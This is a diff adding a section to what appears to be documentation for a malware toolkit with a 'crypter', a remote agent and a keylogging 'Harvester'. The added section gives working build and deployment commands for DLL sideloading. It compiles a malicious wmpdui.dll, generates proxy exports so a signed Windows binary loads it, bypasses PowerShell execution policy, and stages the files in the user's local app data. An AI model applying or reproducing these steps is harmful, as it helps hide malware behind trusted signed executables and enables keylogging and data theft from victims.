@@ -226,6 +226,24 @@ Limits (stated plainly):
 
 ---
 
+### Signed-host DLL sideload
+
+`crypter/dll-loader` builds `wmpdui.dll` (`DllMain` + `Run`). For a signed host
+that imports functions from `wmpdui.dll`, generate the forwarder list and
+rebuild:
+
+```powershell
+powershell -ExecutionPolicy Bypass -File tools\gen_proxy_def.ps1 `
+  -HostExe C:\Windows\System32\wmpdmc.exe -Out crypter\dll-loader\proxy.def
+cargo build -p crypter-dll --release --target x86_64-pc-windows-gnu
+```
+
+Place the signed host, our `wmpdui.dll`, and the renamed original
+`real_wmpdui.dll` in `%LOCALAPPDATA%\WMProcess`, then run
+`tools/sideload.ps1 -Dll ... -UseWmpHost`.
+
+---
+
 ## Harvester (`harvest.rs`, `keylog.rs`)
 
 The agent also carries a data-collection layer. In the WebSocket build, open
